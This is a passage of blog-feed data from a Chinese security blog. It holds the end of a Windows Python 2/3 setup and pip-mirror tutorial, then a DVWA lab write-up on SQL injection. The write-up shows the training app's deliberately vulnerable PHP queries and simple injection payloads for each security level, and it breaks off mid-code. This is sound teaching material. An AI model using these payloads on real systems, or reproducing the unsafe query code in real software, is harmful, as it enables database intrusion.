src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python2用户设置.png" alt="python2用户设置"></center></li><li><p>设置完用户后还需要设置python2的安装位置，默认安装位置为：<code>C:\Python27\</code>，这里我设置其位置为：<code>D:\Soft\Python27\</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python2安装位置.png" alt="python2安装位置"></center></li><li><p>设置完python2安装路径后还需要设置安装python2解释器和基础库，这里采用默认设置即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python2解释器和基础类库设置.png" alt="python2解释器和基础类库设置"></center></li><li><p>所有都设置完成之后就开始python2的安装。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python2安装进度显示.png" alt="python2安装进度显示"></center></li><li><p>稍等几分钟后python2环境安装完毕。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python2安装成功.png" alt="python2安装成功"></center></li><li><p>python2环境安装后，打开python2的安装路径并将<code>python.exe</code>和<code>pythonw.exe</code>分别修改为：<code>python2.exe</code>和<code>pythonw2.exe</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python2重命名python执行文件.png" alt="python2重命名python执行文件"></center></li></ol><h1 id="0x03-python3安装"><a href="#0x03-python3安装" class="headerlink" title="0x03 python3安装"></a>0x03 python3安装</h1><ol><li><p>找到之前下载python3的位置，双击<code>python-3.8.2-amd64.exe</code>文件后开始python3的安装。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python3安装包.png" alt="python3安装包"></center></li><li><p>双击python3安装文件后，首先需要设置python3的用户，是本机所有用户还是仅当前用户，这里勾选<code>Install launcher for all users</code>和<code>Add Python3.8 to PATH</code>并采用自定义安装方式。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python3用户设置.png" alt="python3用户设置"></center></li><li><p>设置安装python3解释器和基础库，这里采用默认设置即可。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python3解释器和基础类库设置.png" alt="python3解释器和基础类库设置"></center></li><li><p>设置完安装的基础类库后还需要设置python3的安装位置，默认安装位置为：<code>C:\Pargram Files\Python38\</code>，这里我设置其位置为：<code>D:\Soft\Python38\</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python3设置安装路径.png" alt="python3设置安装路径"></center></li><li><p>所有都设置完成之后就开始python3的安装。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python3安装过程显示.png" alt="python3安装过程显示"></center></li><li><p>稍等几分钟后python3环境安装完毕。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python3SetupWasSuccessful.png" alt="python3SetupWasSuccessful"></center></li><li><p>python3环境安装后，打开python3的安装路径并将<code>python.exe</code>和<code>pythonw.exe</code>分别修改为：<code>python3.exe</code>和<code>pythonw3.exe</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python3执行文件修改.png" alt="python3执行文件修改"></center></li></ol><h1 id="0x04-配置环境变量"><a href="#0x04-配置环境变量" class="headerlink" title="0x04 配置环境变量"></a>0x04 配置环境变量</h1><p>​        首先打开环境变量设置页面，【此电脑】-&gt; 【属性】-&gt; 【高级系统设置】-&gt; 【环境变量】；然后将<code>C:\Python27</code>目录及<code>C:\python27\scripts(pip目录)</code>、<code>C:\Python38</code>及<code>C:\python38\scripts</code>添加到系统Path变量中。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python环境变量设置.png" alt="python环境变量设置"></center><h1 id="0x05-测试python环境"><a href="#0x05-测试python环境" class="headerlink" title="0x05 测试python环境"></a>0x05 测试python环境</h1><p>在PowerShell中分别输入<code>python2</code>和<code>python3</code>来测试python2和python3环境是否安装成功。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python环境测试.png" alt="python环境测试"></center><h1 id="0x06-配置pip包管理工具"><a href="#0x06-配置pip包管理工具" class="headerlink" title="0x06 配置pip包管理工具"></a>0x06 配置pip包管理工具</h1><p>​        python中很重要的一个工具就是pip包管理工具，有时候安装新的模块\包都要用到，所以我们要把python2和python3的pip区分开来，使得两个python版本的pip能够共存。</p><p>​        在powershell命令框输入命令，<code>python3 -m pip install --upgrade pip --force-reinstall</code>，显示重新安装成功，则pip3安装成功。</p><p>​        在powershell命令框输入命令，<code>python2 -m pip install --upgrade pip --force-reinstall</code>，显示重新安装成功，则pip2安装成功。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/pip2和pip3设置.png" alt="pip2和pip3设置"></center><p>​        现在可以通过<code>pip2 -V</code>和 <code>pip3 -V</code> 查看两个版本的pip信息，以后只需运行<code>pip2 install XXX</code>和<code>pip3 install XXX</code>即可安装各自的python包。</p><h1 id="0x07-配置pip镜像"><a href="#0x07-配置pip镜像" class="headerlink" title="0x07 配置pip镜像"></a>0x07 配置pip镜像</h1><p>​        一般安装python之后，pip默认的镜像地址是：<a href="https://pypi.org/simple" target="_blank" rel="noopener">https://pypi.org/simple</a>  但是由于默认的官方pypi经常被墙，或者连接速度较慢，导致pip安装经常不可用或者下载安装包失败，所以我们最好是将自己使用的pip源更换一下，使用境内的pip镜像安装源。</p><p>网上有很多可用的源，例如：</p><p><strong>清华大学</strong>：<a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a> 清华大学的pip源是官网pypi的镜像，每隔5分钟同步一次，<strong>重点推荐！！！</strong></p><p><strong>阿里云</strong>：<a href="http://mirrors.aliyun.com/pypi/simple/" target="_blank" rel="noopener">http://mirrors.aliyun.com/pypi/simple/</a></p><p><strong>中国科技大学</strong> <a href="https://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="noopener">https://pypi.mirrors.ustc.edu.cn/simple/</a></p><p><strong>华中理工大学</strong>：<a href="http://pypi.hustunique.com/" target="_blank" rel="noopener">http://pypi.hustunique.com/</a></p><p><strong>山东理工大学</strong>：<a href="http://pypi.sdutlinux.org/" target="_blank" rel="noopener">http://pypi.sdutlinux.org/</a> </p><p><strong>豆瓣</strong>：<a href="http://pypi.douban.com/simple/" target="_blank" rel="noopener">http://pypi.douban.com/simple/</a></p><p>网易：<a href="http://mirrors.163.com/pypi/simple/" target="_blank" rel="noopener">http://mirrors.163.com/pypi/simple/</a></p><p>注:</p><ul><li>使用<code>pip config list</code>命令查看当前pip镜像地址：</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/查看pip镜像地址.png" alt="查看pip镜像地址"></center><h2 id="使用临时镜像地址"><a href="#使用临时镜像地址" class="headerlink" title="使用临时镜像地址"></a>使用临时镜像地址</h2><p>在使用pip的时候加参数 <code>-i https://pypi.tuna.tsinghua.edu.cn/simple</code></p><p>例如：</p><p><code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyspider</code>，这样就会从清华这边的镜像去安装<code>pyspider</code>库。</p><h2 id="永久修改pip镜像-推荐"><a href="#永久修改pip镜像-推荐" class="headerlink" title="永久修改pip镜像(推荐)"></a>永久修改pip镜像(推荐)</h2><p>升级 pip 到最新的版本<code>(&gt;=10.0.0)</code>后进行配置：</p><pre class=" language-powershell"><code class="language-powershell">pip install pip <span class="token operator">-</span>Upip config <span class="token function">set</span> global<span class="token punctuation">.</span>index<span class="token operator">-</span>url https:<span class="token operator">/</span><span class="token operator">/</span>pypi<span class="token punctuation">.</span>tuna<span class="token punctuation">.</span>tsinghua<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>simple</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/永久修改pip镜像.png" alt="永久修改pip镜像"></center><ul><li><p>实质是创建了一个<code>pip.ini</code>文件，内容为：</p><pre class=" language-powershell"><code class="language-powershell"><span class="token namespace">[global]</span>index<span class="token operator">-</span>url = https:<span class="token operator">/</span><span class="token operator">/</span>pypi<span class="token punctuation">.</span>tuna<span class="token punctuation">.</span>tsinghua<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>simple</code></pre></li></ul><p>至此，Python2.7与Python3.8双环境共存设置完毕。</p><h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul><li><a href="https://www.jb51.net/article/171778.htm" target="_blank" rel="noopener">Win10下python 2.7与python 3.7双环境安装教程图解</a></li><li><a href="https://www.cnblogs.com/gisen_6/p/12256545.html" target="_blank" rel="noopener">更换Python pip库镜像地址</a></li><li><a href="https://blog.csdn.net/birdlee0524/article/details/83450405" target="_blank" rel="noopener">修改PIP安装源为清华镜像地址</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-SQLInjection</title>
      <link href="/2020/09/17/dvwa-sqlinjection/"/>
      <url>/2020/09/17/dvwa-sqlinjection/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>​        SQL 注入是指应用程序中数据与操作未作分离，导致将攻击者提交的恶意数据拼写到 SQL 语句中当作代码执行从而产生攻击行为。</p><p><strong>SQL Injection模块分析</strong></p><ul><li>仿用户信息查询，输入用户ID即可查询用户相关信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/仿用户信息查询.png" alt="仿用户信息查询"></center><ul><li>正常查询用户信息，查询ID为1的用户信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/userid=1用户信息查询结果.png" alt="userid=1用户信息查询结果"></center><h1 id="0x02-测试工具"><a href="#0x02-测试工具" class="headerlink" title="0x02 测试工具"></a>0x02 测试工具</h1><ul><li>FireFox</li><li>sqlmap</li><li>burp suite</li></ul><h1 id="0x03-漏洞测试"><a href="#0x03-漏洞测试" class="headerlink" title="0x03 漏洞测试"></a>0x03 漏洞测试</h1><h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><p>设置 DVWA 安全级别为 LOW 。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Low.png" alt="SecurityLevel_Low"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check database</span>    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Get results</span>    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Get values</span>        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"first_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"last_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Feedback for end user</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>ID: {$id}&lt;br />First name: {$first}&lt;br />Surname: {$last}&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>查找过程直接将提交的 id 拼写到 sql 中进行执行，存在字符串类型注入。</li></ul><p><strong>漏洞利用</strong>：</p><ul><li>使用FireFox发起查找请求，Payload：<code>1&#39;or&#39;1&#39;=&#39;1</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/SQLi-low-payload-result.png" alt="payload执行结果"></center><ul><li>使用sqlmap进行SQL注入</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/SQLi-low-sqlmap-copycookie.png" alt="复制cookie信息"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/SQLi-low-sqlmap-result.png" alt="SQLMap注结果"></center><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>​        设置 DVWA 安全级别为 Medium。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Medium.png" alt="SecurityLevel_Medium"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Get results</span>    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Display values</span>        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"first_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"last_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Feedback for end user</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>ID: {$id}&lt;br />First name: {$first}&lt;br />Surname: {$last}&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// This is used later on in the index.php page</span><span class="token comment" spellcheck="true">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"SELECT COUNT(*) FROM users;"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$number_of_rows</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><ul><li>针对提交的进行转义处理，但对于整数类型注入限制有限，可利用整数类型注入进行利用。</li></ul><p><strong>漏洞利用：</strong></p><ul><li>启用Burp Suite并设置代理功能。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/Proxy-Option设置.png" alt="Proxy-Option设置"></center><ul><li>设置FireFox浏览器代理为：<code>127.0.0.1:8080</code>。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/FireFox代理设置.png" alt="FireFox代理设置"></center><ul><li>开启Burp Suite拦截。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/开启BurpSuite代理拦截.png" alt="开启BurpSuite代理拦截"></center><ul><li>使用FireFox浏览器发起查询请求。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/SQLi-Medium-查询请求.png" alt="查询请求"></center><ul><li>使用Burp Suite进行SQL注入。payload：<code>1 or 1=1</code>。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/SQLi-Medium-SQLi.png" alt="BurpSuite进行SQL注入"></center><ul><li>BurpSuite执行SQL注入结果。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/SQLi-Medium-SQLi-result.png" alt="BurpSuite-SQL注入结果"></center><ul><li>使用SQLMap进行SQL注入。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/SQLi-Medium-sqlmap-copycookie.png" alt="SQLi-Medium-sqlmap-copycookie"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/SQLi-Medium-sqlmap-result.png" alt="SQLi-Medium-sqlmap-result"></center><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>​    设置 DVWA 安全级别为 High。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_High.png" alt="SecurityLevel_High"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span> <span class="token punctuation">[</span> <span class="token string">'id'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Check database</span>    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>Something went wrong.&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Get results</span>    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Get values</span>        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"first_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"last_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Feedback for end user</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>ID: {$id}&lt;br />First name: {$first}&lt;br />Surname: {$last}&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>数据从<code>Session</code>中获取，但存放过程中未作任何转义和过滤，在 sql 中存在<code>limit 1</code> 但可以通过提交数据中带注释付进行忽略。</li></ul><p><strong>漏洞利用：</strong></p><ul><li>使用FireFox浏览器发起攻击，payload:<code>1&#39; or 1=1 #</code>。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/SQLi-high-payload.png" alt="payload"></center><ul><li>payload执行结果。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/SQLInjection/SQLi-high-payload-result.png" alt="payload执行结果"></center><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>​        设置 DVWA 安全级别为 Impossible。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Impossible.png" alt="SecurityLevel_Impossible"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Get input</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Was a number entered?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Check the database</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':id'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token 